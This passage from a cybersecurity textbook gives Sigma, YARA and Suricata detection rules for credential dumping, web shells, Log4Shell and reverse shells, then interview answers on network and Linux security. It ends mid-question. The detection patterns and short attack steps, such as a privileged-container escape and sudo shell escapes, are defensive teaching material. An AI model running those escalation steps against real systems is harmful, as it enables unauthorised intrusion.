| **`Event ID 18`** | `PipeEvent (Pipe Connected)` | Logs client-to-server connections over Named Pipes (correlates SMB lateral movement and local RPC coercion). |
| **`Event ID 19`** | `WmiEvent (WmiEventFilter)` | Detects creation of permanent WMI Event Filters (`__EventFilter`) used for fileless persistence (`T1546.003`). |
| **`Event ID 20`** | `WmiEvent (WmiEventConsumer)` | Detects creation of WMI Event Consumers (`CommandLineEventConsumer`, `ActiveScriptEventConsumer`). |
| **`Event ID 21`** | `WmiEvent (WmiEventConsumerToFilter)` | Detects binding of a WMI Consumer to a WMI Filter (`__FilterToConsumerBinding`). |
| **`Event ID 22`** | `DNSEvent (DNS Query)` | Logs every DNS query (`QueryName`, `QueryResults`) paired with the exact `Image` executable that issued the DNS resolution request. |
| **`Event ID 23`** | `FileDelete (Archived)` | Logs file deletions and optionally archives a copy of the deleted file to the protected `C:\Sysmon` directory. |
| **`Event ID 24`** | `ClipboardChange` | Logs clipboard content changes inside interactive/RDP sessions. |
| **`Event ID 25`** | `ProcessTampering` | Detects **Process Hollowing** and **Process Herpaderping** where a process image in memory is replaced or modified prior to thread execution. |
| **`Event ID 26`** | `FileDeleteDetected` | Logs file deletion metadata (`User`, `Image`, `TargetFilename`, `Hashes`) without archiving the binary payload to disk. |

---

## 53.4 Authoring Production Detection Rules: Sigma, YARA & Suricata/Snort

### 53.4.1 Sigma Rules (Vendor-Agnostic SIEM Detection Standard)
**Sigma** is to log files what YARA is to files and Snort/Suricata is to network packets. A single YAML Sigma rule can be compiled via `sigma-cli` (`pySigma`) into **Splunk SPL**, **Elastic EQL/KQL**, **Microsoft Sentinel KQL**, **Wazuh XML**, or **QRadar AQL**.

#### Sigma Rule Anatomy
- `title`, `id` (UUIDv4), `status` (`experimental`, `test`, `production`), `level` (`informational`, `low`, `medium`, `high`, `critical`).
- `logsource`: Defines `category` (`process_creation`, `process_access`, `network_connection`, `dns_query`), `product` (`windows`, `linux`, `aws`), and `service` (`security`, `sysmon`, `auditd`).
- `detection`: Named search identifiers (`selection_*`, `filter_*`) using field modifiers (`|contains`, `|endswith`, `|startswith`, `|all`, `|base64offset`, `|re`, `|cidr`) combined via Boolean logic in `condition`.

#### Production Example 1: Sigma Rule for LSASS Memory Credential Dumping (`Sysmon Event ID 10`)
```yaml
title: Suspicious LSASS Process Memory Access for Credential Dumping
id: 4f8e1a2b-9c3d-4e5f-8a1b-2c3d4e5f6a7b
status: production
description: Detects non-system processes opening a read/vm_read handle to lsass.exe indicative of Mimikatz, ProcDump, NanoDump, or Comsvcs.dll MiniDump execution.
author: Sri Lankan Elite Cyber Defense Reference
date: 2026/11/02
references:
  - https://attack.mitre.org/techniques/T1003/001/
logsource:
  category: process_access
  product: windows
detection:
  selection_target:
    TargetImage|endswith: '\lsass.exe'
  selection_access_mask:
    GrantedAccess|contains:
      - '0x1010'
      - '0x1410'
      - '0x1438'
      - '0x143a'
      - '0x1fffff'
      - '0x1f0fff'
      - '0x1f1fff'
  filter_legitimate_system:
    SourceImage|startswith:
      - 'C:\Windows\System32\wbem\wmiprvse.exe'
      - 'C:\Windows\System32\svchost.exe'
      - 'C:\ProgramData\Microsoft\Windows Defender\Platform\'
  condition: selection_target and selection_access_mask and not filter_legitimate_system
falsepositives:
  - Unlisted third-party EDR or antivirus agents scanning LSASS memory
level: critical
tags:
  - attack.credential_access
  - attack.t1003.001
```

#### Production Example 2: Sigma Rule for `comsvcs.dll` `MiniDump` via `rundll32.exe`
```yaml
title: LSASS Memory Dump via Rundll32 and Comsvcs.dll MiniDump
id: 7a1c9e30-5b21-4f88-9012-384910293847
status: production
description: Detects adversaries leveraging the built-in Windows comsvcs.dll MiniDump export via rundll32.exe to dump LSASS process memory without dropping external tools.
author: Sri Lankan Elite Cyber Defense Reference
date: 2026/11/02
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    - Image|endswith: '\rundll32.exe'
    - OriginalFileName: 'RUNDLL32.EXE'
  selection_cli:
    CommandLine|contains:
      - 'comsvcs'
      - 'MiniDump'
      - '#24'
  condition: selection_img and selection_cli
falsepositives:
  - None expected in normal enterprise operations
level: critical
tags:
  - attack.credential_access
  - attack.t1003.001
```

---

### 53.4.2 YARA Rules (Binary, Memory & File Artifact Pattern Matching)
**YARA** identifies and classifies malware samples, web shells, and in-memory beacons using hexadecimal byte sequences (with wildcards `?` and jumps `[4-8]`), ASCII/UTF-16 (`wide`) strings, regular expressions, and module conditions (`pe`, `elf`, `math`).

#### Production Example 1: YARA Rule for Obfuscated ASP.NET / C# & PHP Web Shells
```yara
import "math"

rule WEBSHELL_Multi_Platform_Generic_Indicators {
    meta:
        description = "Detects obfuscated PHP and ASP.NET (.aspx/.ashx) web shells on enterprise web servers"
        author = "Sri Lankan Elite Cyber Defense Reference"
        date = "2026-11-02"
        severity = "Critical"
        mitre_attack = "T1505.003"

    strings:
        // File type headers / tags
        $tag_php = "<?php" ascii nocase
        $tag_aspx1 = "<%@ Page" ascii nocase
        $tag_aspx2 = "<%@ WebHandler" ascii nocase

        // Dangerous execution sinks in PHP
        $php_exec1 = "shell_exec(" ascii nocase
        $php_exec2 = "passthru(" ascii nocase
        $php_exec3 = "proc_open(" ascii nocase
        $php_obf1  = /eval\s*\(\s*(base64_decode|gzinflate|str_rot13)/ ascii nocase

        // Dangerous execution sinks in ASP.NET / C# / JScript.NET
        $net_exec1 = "System.Diagnostics.Process" ascii wide nocase
        $net_exec2 = "ProcessStartInfo" ascii wide nocase
        $net_exec3 = "FromBase64String" ascii wide nocase
        $net_exec4 = "System.Reflection.Assembly.Load" ascii wide nocase
        $net_jscript = "eval(Request.Item[" ascii wide nocase

    condition:
        filesize < 500KB and
        (
            ($tag_php and (1 of ($php_obf*) or 2 of ($php_exec*))) or
            (any of ($tag_aspx*) and ($net_jscript or (2 of ($net_exec*))))
        )
}
```

#### Production Example 2: YARA Rule for Suspicious Unpacked/Reflective PE Loader in Memory
```yara
import "pe"
import "math"

rule MALWARE_Reflective_PE_Loader_Characteristics {
    meta:
        description = "Detects Windows PE binaries exhibiting reflective DLL injection imports, high section entropy, and process hollowing APIs"
        author = "Sri Lankan Elite Cyber Defense Reference"
        date = "2026-11-02"
        mitre_attack = "T1055.001, T1620"

    strings:
        // MZ header at offset 0
        $mz = { 4D 5A }

        // ReflectiveLoader export name or common API hash resolution stub
        $refl_export = "ReflectiveLoader" ascii wide
        $api_valloc  = "VirtualAllocEx" ascii
        $api_wpm     = "WriteProcessMemory" ascii
        $api_crt     = "CreateRemoteThread" ascii
        $api_ntunmap = "NtUnmapViewOfSection" ascii

        // x64 PEB walk shellcode stub: mov rax, gs:[60h] (65 48 8B 04 25 60 00 00 00)
        $peb_walk_x64 = { 65 48 8B 04 25 60 00 00 00 }

    condition:
        uint16(0) == 0x5A4D and
        filesize < 5MB and
        (
            $refl_export or
            $peb_walk_x64 or
            (all of ($api_*)) or
            (
                for any i in (0..pe.number_of_sections - 1): (
                    (pe.sections[i].characteristics & pe.SECTION_MEM_EXECUTE) != 0 and
                    (pe.sections[i].characteristics & pe.SECTION_MEM_WRITE) != 0 and
                    math.entropy(pe.sections[i].raw_data_offset, pe.sections[i].raw_data_size) > 7.2
                )
            )
        )
}
```

---

### 53.4.3 Suricata / Snort Network IDS/IPS Rules
Network Intrusion Detection and Prevention Systems (**Suricata** and **Snort 3**) inspect packet headers and reassembled application-layer streams (`http`, `tls`, `smb`, `krb5`, `dns`).

#### Suricata Rule Syntax Structure
```text
action protocol src_ip src_port -> dst_ip dst_port (rule_options;)
```
- **Actions:** `alert` (generate alert), `drop` (block packet immediately in IPS inline mode and log), `pass` (ignore matching traffic), `reject` (drop and send TCP RST / ICMP unreachable).
- **Sticky Buffers (Suricata 6/7):** `http.uri`, `http.method`, `http.user_agent`, `http.request_body`, `tls.sni`, `dns.query`, `ja3.hash`.

#### Production Suricata Rule Set (`/etc/suricata/rules/enterprise-local.rules`)
```suricata
# Rule 1: Detect Inbound JNDI / Log4Shell Exploitation Attempts across HTTP Headers & URI (CVE-2021-44228)
drop http $EXTERNAL_NET any -> $HOME_NET any ( \
    msg:"ET EXPLOIT Apache Log4j JNDI Remote Code Execution Attempt (CVE-2021-44228)"; \
    flow:established,to_server; \
    pcre:"/\$\{(jndi|lower|upper|env|sys|date)[^\}]*(ldap|ldaps|rmi|dns|iiop|corba|nds|http):/i"; \
    classtype:attempted-admin; \
    reference:cve,2021-44228; \
    sid:9000101; rev:2; \
)

# Rule 2: Detect Outbound Linux Reverse Shell / Interactive `/bin/sh` Command Output (`uid=0(root)` / `uid=`)
alert tcp $HOME_NET any -> $EXTERNAL_NET any ( \
    msg:"ET ATTACK_RESPONSE Linux id Command Output Over Raw TCP (uid= / gid=)"; \
    flow:established,from_server; \
    content:"uid="; \
    content:"gid="; distance:0; within:35; \
    pcre:"/uid=\d+\([a-z0-9_-]+\)\s+gid=\d+\([a-z0-9_-]+\)/i"; \
    classtype:successful-user; \
    sid:9000102; rev:1; \
)

# Rule 3: Detect Impacket PsExec / SMB Named Pipe Service Execution (`SVCCTL` over `\pipe\svcctl`)
alert smb any any -> $HOME_NET 445 ( \
    msg:"ET LATERAL_MOVEMENT SMB RemCom / Impacket Service Creation Named Pipe Access"; \
    flow:established,to_server; \
    content:"|5c 00|s|00|v|00|c|00|c|00|t|00|l|00|"; \
    classtype:trojan-activity; \
    metadata:mitre_tactic_id TA0008, mitre_technique_id T1021_002; \
    sid:9000103; rev:1; \
)

# Rule 4: Detect SSRF / Proxy Attempt Targeting Cloud Instance Metadata IP in HTTP Request
drop http $EXTERNAL_NET any -> $HOME_NET any ( \
    msg:"ET WEB_SERVER SSRF Attempt Targeting Cloud Instance Metadata 169.254.169.254"; \
    flow:established,to_server; \
    http.uri; content:"169.254.169.254"; nocase; \
    classtype:web-application-attack; \
    sid:9000104; rev:1; \
)
```

---

# CHAPTER 54: 150+ CYBERSECURITY INTERVIEW QUESTIONS, ANSWERS & SRI LANKA CAREER GUIDE

This chapter provides a complete technical interview preparation encyclopedia comprising **160 rigorous cybersecurity interview questions and authoritative model answers**, followed by a dedicated **Sri Lankan & Global Cybersecurity Career Engineering Guide** covering university pathways, local industry employers, regulatory frameworks (Sri Lanka CERT|CC, CBSL, PDPA), and certification roadmaps.

---

## 54.1 Section 1: Networking & Protocol Security (Questions 1–20)

**Q1. Explain the exact packet-level flow of the TCP 3-Way Handshake and how SYN Flood attacks exploit it, along with kernel-level mitigations.**
- **Answer:** A client initiates a TCP connection by sending a `SYN` segment with a randomized Initial Sequence Number ($\text{ISN}_c$). The server allocates state in its half-open **SYN Queue** (`tcp_max_syn_backlog`) and replies with `SYN-ACK` ($\text{ISN}_s$, $\text{ACK} = \text{ISN}_c + 1$). The client responds with `ACK` ($\text{SEQ} = \text{ISN}_c + 1, \text{ACK} = \text{ISN}_s + 1$), moving the socket into the **Accept Queue** (`somaxconn`). A **SYN Flood** exhausts the SYN queue by sending spoofed `SYN` packets without completing the final `ACK`. **Mitigation:** Enable **TCP SYN Cookies** (`net.ipv4.tcp_syncookies = 1`), where the kernel encodes connection state into the 32-bit $\text{ISN}_s$ (`timestamp || MSS_index || HMAC(client_IP, port, secret)`) without allocating memory until the client returns a valid `ACK`.

**Q2. What is the difference between TCP connection termination via the 4-Way FIN Handshake versus a TCP RST packet?**
- **Answer:** A graceful termination uses a 4-way handshake (`FIN` $\rightarrow$ `ACK` $\rightarrow$ `FIN` $\rightarrow$ `ACK`) because TCP is full-duplex and each direction must be closed independently, placing the active closer into the `TIME_WAIT` state for $2 \times \text{MSL}$ (Maximum Segment Lifetime) to absorb delayed segments. A `RST` (Reset) packet aborts the connection immediately without waiting for buffered data or entering `TIME_WAIT`, dropping all queued buffers.

**Q3. Walk through every step of what happens on the wire when a user types `https://bank.lk` into a browser.**
- **Answer:** (1) Browser checks HSTS preload list to enforce HTTPS. (2) DNS resolution checks browser cache, OS stub resolver (`/etc/hosts`, `systemd-resolved`), and sends UDP/53 (or DoH/DoT) iterative/recursive queries to Root (`.`), TLD (`.lk`), and Authoritative nameservers. (3) OS checks ARP cache (`ip neigh`) for the default gateway's MAC address, sending an ARP broadcast if missing. (4) TCP 3-way handshake completes on port `443` (or QUIC UDP handshake for HTTP/3). (5) TLS 1.3 handshake completes in 1-RTT (`ClientHello` with key_share + `SNI` $\rightarrow$ `ServerHello`, `EncryptedExtensions`, `Certificate`, `CertificateVerify`, `Finished`). (6) Browser verifies the X.509 certificate chain, SANs, validity period, and OCSP/CRL revocation status. (7) HTTP/2 `GET /` request is encrypted under the derived symmetric AEAD session key (`AES-256-GCM` or `ChaCha20-Poly1305`).

**Q4. Compare TLS 1.2 and TLS 1.3 handshakes from both a latency and cryptographic security perspective.**
- **Answer:** TLS 1.2 requires **2-RTT** before application data flows, transmits the server certificate in cleartext, and historically permitted static RSA key exchange (which lacks Forward Secrecy), CBC-mode ciphers (vulnerable to Padding Oracle attacks like POODLE/Lucky13), and renegotiation. **TLS 1.3 (RFC 8446)** completes in **1-RTT** (client sends DH key shares inside `ClientHello`), encrypts all handshake messages after `ServerHello` (hiding the server certificate), mandates **Ephemeral Diffie-Hellman (ECDHE/DHE)** for mandatory **Forward Secrecy (PFS)**, and permits **only AEAD cipher suites** (`TLS_AES_128_GCM_SHA256`, `TLS_AES_256_GCM_SHA384`, `TLS_CHACHA20_POLY1305_SHA256`).

**Q5. How does ARP Spoofing / Poisoning work on a Layer 2 switched LAN, and what switch-level controls prevent it?**
- **Answer:** Because standard ARP (RFC 826) is stateless and unauthenticated, any host on a broadcast domain can send gratuitous ARP replies associating its own MAC address with the IP address of the default gateway (`10.10.10.1 is-at <Attacker_MAC>`). Victim hosts overwrite their ARP cache and forward frames to the attacker (Man-in-the-Middle). **Mitigation:** Enable **DHCP Snooping** (which builds a trusted hardware database binding MAC, IP, VLAN, and switch port) paired with **Dynamic ARP Inspection (DAI)**, which intercepts and drops any ARP packet whose MAC-to-IP mapping does not match the DHCP Snooping binding table.

**Q6. What is VLAN Hopping (Switch Spoofing vs. Double Tagging), and how do you harden trunk and access ports against it?**
- **Answer:** (1) **Switch Spoofing:** An attacker connected to a port configured with Dynamic Trunking Protocol (`DTP desirable/auto`) sends DTP frames to negotiate an 802.1Q trunk and access all VLANs. (2) **Double Tagging:** When an attacker is on an access port belonging to the trunk's **Native (untagged) VLAN**, they send a frame with two 802.1Q tags (`[Outer: Native VLAN][Inner: Victim VLAN]`). The first switch strips the outer tag and forwards the frame out the trunk with the inner tag intact. **Mitigation:** Explicitly set user ports to `switchport mode access`, disable DTP (`switchport nonegotiate`), change the Native VLAN on all trunks to an unused dummy VLAN ID (never VLAN 1), and explicitly tag the Native VLAN (`vlan dot1q tag native`).

**Q7. Explain DNS Cache Poisoning (Kaminsky Attack) and how DNSSEC cryptographically prevents it.**
- **Answer:** Standard DNS queries use a 16-bit Transaction ID (`TXID`, 65,536 possibilities) and an ephemeral UDP source port. In the Kaminsky attack, an attacker forces a recursive resolver to query a non-existent subdomain (`random123.bank.lk`) and floods the resolver with spoofed responses containing an `NS` delegation record and glue `A` record overwriting the entire `bank.lk` zone before the real authoritative server replies. **DNSSEC** prevents this without encrypting queries by creating a cryptographic chain of trust from the Root Zone using digital signatures: `RRSIG` (signature over resource record sets), `DNSKEY` (public zone signing key / key signing key), `DS` (Delegation Signer hash in parent zone), and `NSEC`/`NSEC3` (authenticated denial of existence).

**Q8. Differentiate between a Stateful Firewall, a Stateless Packet Filter (ACL), and a Next-Generation Firewall (NGFW) / WAF.**
- **Answer:** A **Stateless ACL** inspects each packet in isolation based solely on Layer 3/4 headers (Src/Dst IP, Port, TCP flags) without tracking whether a packet belongs to an existing connection. A **Stateful Firewall** (`conntrack` in Linux `nftables`/`iptables`) maintains a state table tracking `NEW`, `ESTABLISHED`, and `RELATED` flows, automatically permitting return traffic only for valid sessions. An **NGFW** adds Layer 7 Deep Packet Inspection (DPI), TLS inspection, Application ID verification, and IPS signatures, while a **WAF** parses HTTP/HTTPS/GraphQL semantics (headers, cookies, JSON/multipart bodies) to block application-layer attacks (SQLi, XSS, SSRF).

**Q9. How do Nmap `-sS` (SYN Stealth), `-sT` (Connect), `-sU` (UDP), and `-sA` (ACK) scans differ on the wire?**
- **Answer:** `-sS` sends a raw `SYN` packet; if `SYN-ACK` returns, the port is `open` and Nmap immediately sends `RST` before completing the handshake. `-sT` invokes the OS `connect()` syscall, completing the full 3-way handshake. `-sU` sends UDP payloads; an ICMP Type 3 Code 3 (`Port Unreachable`) indicates `closed`, while a protocol response indicates `open`. `-sA` sends an unsolicited `ACK` packet solely to map **stateful firewall rules**: an unfiltered port (whether open or closed) responds with `RST`, whereas a stateful firewall drops the unsolicited `ACK` (`filtered`).

**Q10. What is BGP Route Hijacking, and what cryptographic standard secures inter-domain routing?**
- **Answer:** Border Gateway Protocol (BGP) inherently trusts Autonomous Systems (AS) to announce IP prefixes they own. If a malicious or misconfigured AS announces a more specific prefix (e.g., `/24` instead of `/16`) or a shorter AS-Path for a victim's IP block, global traffic is rerouted to the hijacker. **Mitigation:** Deploy **RPKI (Resource Public Key Infrastructure)** with **ROAs (Route Origin Authorizations)** so routers verify cryptographically that an AS is authorized to originate a prefix (Route Origin Validation), combined with **BGPsec** to sign the full AS-Path.

**Q11. Why is WPA2-Personal (PSK) vulnerable to offline dictionary attacks via the 4-Way Handshake or PMKID, and how does WPA3-SAE fix this?**
- **Answer:** In WPA2-PSK, the Pairwise Master Key ($\text{PMK}$) is derived statically via $\text{PBKDF2-HMAC-SHA1}(\text{Passphrase}, \text{SSID}, 4096, 256)$. Capturing the EAPOL 4-Way Handshake (`ANonce`, `SNonce`, MACs, and `MIC`) or a single RSN `PMKID` frame from the Access Point allows an attacker to brute-force the passphrase offline without interacting with the AP. **WPA3** replaces static PSK derivation with **SAE (Simultaneous Authentication of Equals / Dragonfly handshake)**, a zero-knowledge Password-Authenticated Key Exchange (PAKE) using ephemeral Diffie-Hellman where each password guess requires an active online handshake interaction, eliminating offline dictionary cracking and providing Forward Secrecy.

**Q12. What is the difference between IPSec Tunnel Mode and Transport Mode, and between IKEv1 and IKEv2?**
- **Answer:** **Transport Mode** encrypts/authenticates only the IP payload (leaving the original IP header intact), used for host-to-host communication. **Tunnel Mode** encapsulates and encrypts the entire original IP packet inside a new outer IP header, used for site-to-site VPN gateways. **IKEv2** (RFC 7296) reduces SA negotiation from 6–9 messages (IKEv1 Main Mode + Quick Mode) to 4 messages, includes built-in NAT-Traversal (`UDP/4500`), native Dead Peer Detection, MOBIKE mobility support, and protection against DoS amplification via stateless cookies.

**Q13. How does HTTP Request Smuggling (`CL.TE` and `TE.CL`) occur in reverse-proxy architectures?**
- **Answer:** Request Smuggling occurs when a frontend reverse proxy/CDN and a backend application server disagree on where one HTTP/1.1 request ends and the next begins over a persistent keep-alive TCP connection. In **CL.TE**, the frontend uses `Content-Length` while the backend prioritizes `Transfer-Encoding: chunked` (or vice versa in **TE.CL**, often triggered by obfuscated headers like `Transfer-Encoding: xchunked`). The residual bytes of the first request remain in the backend socket buffer and prefix the next legitimate user's request. **Mitigation:** Use **HTTP/2 end-to-end**, normalize ambiguous requests at the edge proxy, and reject any HTTP/1.1 request containing both `Content-Length` and `Transfer-Encoding`.

**Q14. What is the security difference between SNAT, DNAT, and PAT, and why is NAT not a substitute for a Stateful Firewall?**
- **Answer:** **SNAT** rewrites the source IP of outbound packets; **PAT (Port Address Translation / Masquerading)** maps multiple internal private IPs to a single public IP using distinct source ports; **DNAT** rewrites the destination IP/port of inbound packets. While PAT prevents unsolicited inbound connections when no mapping exists in the translation table, NAT is purely an address translation mechanism—if static 1:1 NAT, IPv6, or UPnP/STUN hole-punching is active, packets traverse unless blocked by explicit stateful firewall filtering policies.

**Q15. Explain DNS Rebinding and how it bypasses Same-Origin Policy (SOP) to attack internal RFC 1918 services or SSRF filters.**
- **Answer:** In DNS Rebinding, an attacker controls an authoritative DNS server for `evil.com` configured with a very short TTL (`TTL=0` or `1` second). First, when a victim browser or SSRF validator resolves `evil.com`, the DNS server returns a public IP (`203.0.113.5`). Seconds later, when the victim's JavaScript (or backend HTTP client) makes a second request to `http://evil.com/admin`, the DNS server responds with `127.0.0.1` or `192.168.1.1`. Because the hostname (`evil.com`) and port remain identical, the browser's Same-Origin Policy permits reading the response. **Mitigation:** Validate the `Host` header on all internal HTTP services, pin the resolved IP address in the HTTP client socket, and block external DNS responses returning RFC 1918 addresses at the corporate DNS resolver (`private-address` filter in Unbound/Bind).

**Q16. What are the security implications of IPv6 Neighbor Discovery Protocol (NDP) and Router Advertisements (RA)?**
- **Answer:** IPv6 replaces ARP with ICMPv6 **Neighbor Solicitation (NS)** and **Neighbor Advertisement (NA)**, and uses **Router Advertisements (RA)** for SLAAC (Stateless Address Auto-Configuration). Without L2 controls, an attacker on the LAN can send spoofed RA packets (`Router Advertisement Spoofing` / `mitm6`) declaring themselves as the default IPv6 router and DNS server (via DHCPv6), intercepting traffic even on IPv4 networks because Windows prefers IPv6 by default. **Mitigation:** Enable **RA Guard** (RFC 6105) and **DHCPv6 Guard** on all access switch ports.

**Q17. How does Mutual TLS (mTLS) work in Zero-Trust / Service Mesh architectures?**
- **Answer:** In standard TLS, only the server presents an X.509 certificate (`Certificate` + `CertificateVerify`) to authenticate itself to the client. In **mTLS**, the server also sends a `CertificateRequest` handshake message specifying acceptable Certificate Authorities (`DistinguishedNames`). The client must respond with its own X.509 client certificate and prove possession of the corresponding private key via a client `CertificateVerify` signature over the handshake transcript hash, ensuring cryptographic bidirectional authentication of both workloads.

**Q18. Explain the difference between IDS (Intrusion Detection System) and IPS (Intrusion Prevention System) deployment topologies.**
- **Answer:** An **IDS** is deployed **out-of-band** (passively listening via a network TAP or switch SPAN/mirror port). It cannot drop malicious packets inline before they reach the target, though it can send TCP `RST` packets or trigger firewall blocks reactively (introducing a race condition). An **IPS** is deployed **inline** along the active packet forwarding path; every packet traverses the IPS engine, allowing it to drop malicious frames (`drop` action) before they reach the destination host.

**Q19. What is SSH Agent Forwarding (`ForwardAgent yes`), why is it dangerous on shared bastion hosts, and what is the secure alternative?**
- **Answer:** `ForwardAgent yes` creates a Unix domain socket (`/tmp/ssh-XXXX/agent.pid`) on the remote bastion host that proxies cryptographic signature requests back to the user's local `ssh-agent`. Any user with `root` access (or sufficient ACL rights) on the bastion host can connect to that Unix socket (`SSH_AUTH_SOCK`) and use the developer's private keys to authenticate to downstream servers for as long as the session is active. **Secure Alternative:** Disable `ForwardAgent` and use **`ProxyJump` (`ssh -J user@bastion user@internal-host`)**, which tunnels the end-to-end SSH connection through the bastion TCP stream while performing all key operations strictly on the client workstation.

**Q20. How does DDoS Amplification / Reflection work over UDP, and what is BCP 38?**
- **Answer:** An attacker sends small UDP requests with a **spoofed source IP address** (the victim's IP) to open UDP services that return much larger responses—such as DNS (`ANY` queries, ~50x amplification), NTP (`monlist`, ~556x), or Memcached (`UDP/11211`, up to 51,000x). All reflectors flood the victim IP. **BCP 38 (RFC 2827 — Network Ingress Filtering)** requires ISPs to drop outbound packets from customer networks whose source IP address does not belong to the customer's allocated IP prefix, stopping IP spoofing at the source.

---

## 54.2 Section 2: Linux Internals, Hardening & Privilege Escalation (Questions 21–40)

**Q21. Explain the difference between Real UID (`ruid`), Effective UID (`euid`), and Saved Set-User-ID (`suid`) in the Linux kernel.**
- **Answer:** Every Linux process task struct (`struct cred`) maintains three UIDs: `ruid` identifies the actual user who launched the process; `euid` is the identity checked by the kernel for almost all file access and permission checks; `suid` stores the previous `euid` so a privileged process can temporarily drop privileges (`seteuid(ruid)`) and re-acquire them later if needed. When a binary with the **SetUID bit** (`chmod u+s` / `04000`) is executed via `execve()`, the kernel sets `euid` and `suid` to the file owner's UID (e.g., `0` for `root`) while keeping `ruid` as the invoking user.

**Q22. What are Linux Capabilities (`man 7 capabilities`), and which specific capabilities are equivalent to full `root` access if granted to an unprivileged binary?**
- **Answer:** Linux Capabilities partition the monolithic power of `root` into 41 distinct privilege units that can be assigned to binaries (`setcap`) or process threads (`CapInh`, `CapPrm`, `CapEff`, `CapBnd`, `CapAmb`). Dangerous capabilities that allow trivial privilege escalation to `root` include:
  - `CAP_SETUID` / `CAP_SETGID`: Allows a process (e.g., `/usr/bin/python3` with `cap_setuid+ep`) to call `os.setuid(0)` and spawn a root shell.
  - `CAP_DAC_READ_SEARCH`: Bypasses all file read and directory traversal permission checks (can read `/etc/shadow` or `/root/.ssh/id_rsa`).
  - `CAP_DAC_OVERRIDE`: Bypasses all file read, write, and execute permission checks (can overwrite `/etc/passwd` or `/etc/sudoers`).
  - `CAP_SYS_ADMIN`: Allows mounting filesystems, modifying namespaces, and escaping containers.
  - `CAP_SYS_PTRACE`: Allows `ptrace()` injection into root processes executing on the same host.

**Q23. How are password hashes formatted in `/etc/shadow`, and which hashing algorithm is used on modern Debian/Ubuntu and RHEL systems?**
- **Answer:** `/etc/shadow` entries follow the format `username:$id$params$salt$hash:lastchanged:min:max:warn:inactive:expire:`. The `$id$` prefix specifies the algorithm:
  - `$1$`: MD5-crypt (Legacy/Insecure)
  - `$5$`: SHA-256-crypt
  - `$6$`: SHA-512-crypt (5,000 rounds default)
  - `$y$` (or `$7$`): **yescrypt** (Memory-hard KDF, default on modern Ubuntu 22.04+ and Debian 11+)
  - `$2b$`: **bcrypt**

**Q24. Why does `sudo -l` output containing `(ALL) NOPASSWD: /usr/bin/vim /var/log/syslog` or `/usr/bin/less` allow immediate root escalation, and how do you fix it?**
- **Answer:** Interactive pagers and editors (`vim`, `less`, `more`, `man`, `awk`, `find`) include built-in shell escape features (`:!sh` in `vim`/`less`). When launched via `sudo`, the child `/bin/sh` inherits `euid=0`. **Remediation:** For read-only log viewing, use `sudoedit` (`sudo -e`) with `SUDO_EDITOR` restricted, or grant read access via POSIX ACLs (`setfacl -m u:analyst:r /var/log/syslog`) or supplementary group membership (`adm`) instead of running interactive binaries as `root`. If `vim` or `less` must be run under `sudo`, enable **`NOEXEC`** in `/etc/sudoers` (`analyst ALL=(root) NOEXEC: /usr/bin/less /var/log/syslog`), which preloads `sudo_noexec.so` to block `execve()` system calls from the child process.

**Q25. How do `LD_PRELOAD` and `LD_LIBRARY_PATH` environment variables work in the GNU dynamic linker (`ld-linux.so`), and how does the kernel protect SUID binaries from them?**
- **Answer:** `LD_PRELOAD` instructs the dynamic linker (`ld.so`) to load a user-specified shared object (`.so`) before any other library (including `libc.so.6`), allowing function hooking or executing code inside `__attribute__((constructor)) void init()`. When a binary is executed in **secure-execution mode** (`AT_SECURE` auxiliary vector set to `1` by the kernel whenever `ruid != euid`, `rgid != egid`, or file capabilities are attached), `ld.so` automatically ignores `LD_PRELOAD` (unless the library is already in a trusted standard directory and also SUID) and strips `LD_LIBRARY_PATH`. However, if `/etc/sudoers` explicitly contains `Defaults env_keep += LD_PRELOAD`, an attacker running any allowed `sudo` command can preload a malicious `.so` as `root`.

**Q26. What is the difference between a Hard Link and a Symbolic (Soft) Link in Linux, and how does `fs.protected_hardlinks=1` prevent privilege escalation?**
- **Answer:** A **Symbolic Link (`ln -s`)** is a special file with its own inode that stores a text path pointing to another file (can cross filesystems and point to directories). A **Hard Link (`ln`)** is an additional directory entry pointing directly to the **exact same inode** on the same filesystem. Historically, an unprivileged user could create a hard link in `/tmp` pointing to a root-owned SUID binary or `/etc/shadow` to exploit race conditions (`TOCTOU`) or vulnerable `chown` scripts. Setting `fs.protected_hardlinks = 1` and `fs.protected_symlinks = 1` in `sysctl` prevents users from creating hard links to files they do not own or lack read/write access to, and blocks following symlinks inside world-writable sticky directories (`/tmp`) unless the symlink owner matches the directory owner or follower.

**Q27. Explain what happens when a Docker container is started with `--privileged`, and how an attacker escapes to the host OS.**
- **Answer:** `--privileged` grants the container all Linux capabilities (`CapEff = 000001ffffffffff`), disables `seccomp` and `AppArmor`/`SELinux` profiles, and exposes all host `/dev/` block devices (`/dev/sda1`, `/dev/nvme0n1p1`). A process inside the container can escape immediately by either: (1) mounting the host root disk directly (`mount /dev/sda1 /mnt/host && chroot /mnt/host`), or (2) abusing cgroup v1 `release_agent` notification scripts (`notify_on_release=1`) which the host kernel executes with full host `root` privileges outside the container namespace.

**Q28. Compare Linux Namespaces and Control Groups (`cgroups`) as the foundational primitives of containerization.**
- **Answer:** **Namespaces** (`pid`, `net`, `mnt`, `ipc`, `uts`, `user`, `cgroup`, `time`) isolate **visibility**—controlling what a process can *see* (e.g., its own PID 1, isolated network stack, and chrooted mount tree). **Control Groups (`cgroups v2`)** isolate and meter **resource consumption**—controlling how much CPU, RAM, disk I/O, and maximum process count (`pids.max` against fork bombs) a hierarchy of processes can *use*.

**Q29. How do SELinux (Mandatory Access Control) and AppArmor differ in architecture?**
- **Answer:** Both implement **Mandatory Access Control (MAC)** via Linux Security Modules (LSM) in the kernel, overriding Discretionary Access Control (DAC / standard `rwx` permissions) even for `root`:
  - **SELinux (RHEL/Fedora):** **Label/Inode-based** Type Enforcement (`user:role:type:level`). Every process has a security domain label (e.g., `httpd_t`) and every file/port has a resource label (e.g., `httpd_sys_content_t`). Even if a file is moved or hard-linked, the inode security extended attribute (`security.selinux`) travels with it.
  - **AppArmor (Ubuntu/Debian/SUSE):** **Path-based** access control (`/etc/apparmor.d/`). Profiles restrict specific binary paths (e.g., `/usr/sbin/nginx`) to an explicit list of file paths, network sockets, and Linux capabilities.

**Q30. What is `seccomp-bpf` (Secure Computing Mode), and how does it harden Linux services and containers?**
